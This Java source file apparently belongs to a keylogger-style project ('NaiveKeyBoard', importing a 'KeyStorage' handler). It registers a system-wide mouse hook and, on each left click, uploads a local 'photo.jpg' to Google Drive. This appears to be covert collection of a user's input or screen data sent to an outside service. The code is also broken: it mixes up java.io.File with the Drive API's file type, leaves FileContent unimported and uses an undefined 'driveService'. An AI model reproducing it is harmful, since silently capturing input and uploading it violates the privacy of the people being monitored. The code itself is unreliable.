package NaiveKeyBoard;

import java.awt.event.MouseEvent;
import java.io.File;

import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

import handlers.KeyStorage;

public class NativeMouse implements NativeMouseListener{

	@Override
	public void nativeMouseClicked(NativeMouseEvent e) {

	}

	@Override
	public void nativeMousePressed(NativeMouseEvent e) {
		if(e.getButton() == MouseEvent.BUTTON1) {
			File fileMetadata = new File();
			fileMetadata.setName("photo.jpg");
			java.io.File filePath = new java.io.File("files/photo.jpg");
			FileContent mediaContent = new FileContent("image/jpeg", filePath);
			File file = driveService.files().create(fileMetadata, mediaContent)
			    .setFields("id")
			    .execute();
			System.out.println("File ID: " + file.getId());

		}
		
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent arg0) {
		
		
	}

}
